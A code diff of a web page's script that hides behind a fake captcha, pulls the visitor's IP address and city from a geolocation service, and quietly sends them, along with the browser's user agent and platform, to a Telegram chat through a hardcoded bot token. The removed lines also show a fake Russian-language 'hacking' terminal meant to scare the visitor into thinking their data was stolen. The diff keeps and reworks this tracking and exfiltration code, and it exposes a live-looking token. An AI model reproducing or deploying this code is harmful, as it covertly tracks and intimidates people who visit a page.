@@ -43,61 +43,40 @@
     </div>
 
     <script>
-        const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
-        const chat_id = "-1003861311533";
-        const sleep = ms => new Promise(res => setTimeout(res, ms));
-
         async function startProcess() {
+             
             document.getElementById('captcha-box').style.display = 'none';
-            const term = document.getElementById('terminal');
-            term.style.display = 'block';
-
-         
-            const lines = [
-                `[TARGET] Инициализация...`,
-                `[INFO] Обход защитных механизмов...`,
-                `[WARNING] Уязвимость найдена: WebRTC`,
-                `[CRITICAL] Доступ к системным логам получен`,
-                `[SUCCESS] Извлечение данных пользователя...`
-            ];
-
-            for (let line of lines) {
-                let p = document.createElement('p');
-                p.innerHTML = line;
-                term.appendChild(p);
-                await sleep(500);
-            }
-
-            
-            await sendLogs();
-            
-            term.style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
-        }
 
-        async function sendLogs() {
+            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
+            const chat_id = "-1003861311533";
+
             try {
-          
+               
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-           
+                 
                 document.getElementById('user-ip').innerText = d.ip;
                 document.getElementById('user-geo').innerText = d.city;
                 document.getElementById('user-dev').innerText = navigator.platform;
 
- 
-                const msg = `🚀 НОВЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}\n💻 ОС: ${navigator.platform}`;
+             
+                const text = `🔥 НОВЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
+
                 
-        
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+                
                 await fetch(url);
+                console.log("Лог отправлен в группу!");
+
             } catch (e) {
-    
-                const err = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
-                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${err}`);
+              
+                const backup = `⚠️ Переход!\n📱 ${navigator.userAgent}`;
+                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
             }
         }
+
     </script>
 </body>
 </html>
